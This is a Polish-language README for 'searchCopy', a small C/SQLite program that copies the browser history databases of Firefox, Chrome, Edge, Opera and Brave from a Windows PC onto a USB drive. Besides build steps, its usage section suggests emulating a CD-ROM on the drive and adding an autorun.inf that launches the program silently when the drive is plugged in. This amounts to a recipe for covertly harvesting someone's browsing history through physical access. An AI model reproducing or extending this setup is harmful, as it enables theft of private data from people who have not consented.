# searchCopy

Prosty skrypt, który automatycznie kopiuje historie pamięci przeglądarki na podłączony pendrive.

## Funkcje
- Kopiuje plik do przygotowanego katalogu na USB
- Obsługuje błędy, gdy pendrive nie jest podłączony

## Wymagania
- Windows (kopiowanie przystosowane do NTFS)
- Pendrive
- Przeglądarka:
  - Firefox
  - Chrome
  - MS Edge
  - Opera
  - Brave
- SQLite3 (poradnik w instalacji poniżej)

## Instalacja
1. Pobierz repozytorium:
   ```bash
   git clone https://github.com/Entrapta2040/searchCopy.git
   cd searchCopy
   ```
2. Pobierz [bibliotekę sqlite3](https://www.sqlite.org/2025/sqlite-amalgamation-3490100.zip) i wypakuj (plik .h i .c)<br>
   - Jeśli masz Linuxa użyj:<br>
   
      - Debian/Ubuntu:<br>
        ```bash
        sudo apt install sqlite3 libsqlite3-dev
        ```
   
      - Arch Linux: <br>
        ```bash
        sudo pacman -S sqlite
        ```
    
      - Fedora: <br>
        ```bash
        sudo dnf install sqlite sqlite-devel
        ```
      
   - Po instalce sprawdź wersje:
     ```bash
     sqlite3 --version
     ```
4. Kompiluj plik przez mingw lub gcc (jeśli kompilujemy z linkusa):
   - W przypadku mingw **(PLIKI MUSZĄ BYC W TYM SAMYM FOLDERZE)**
     ```bash
     gcc program.c sqlite3.c -o nazwajakachcemy.exe
     ```
   - W przypadku gcc
     ```bash
     gcc program.c -o nazwajakachcemy.exe -lsqlite3
     ```

## Jak używać?
Po uruchomieniu pliku automatycznie przekopiuje on pamięć przeglądarki na usb

Aby zautomatyzować działanie sugeruje sie:
1. Zdobycie pendrive na którym można emulować CD-ROM
2. W nowej partycji dodajemy nasze exe i robimy plik autorun.inf w którym dajemy:
   ```ini
   [autorun]
   open=program.exe
   ```
3. Przy podłączeniu pendrive powinno automatycznie przekopiować pliki na pendrive
## Licencja
MIT License
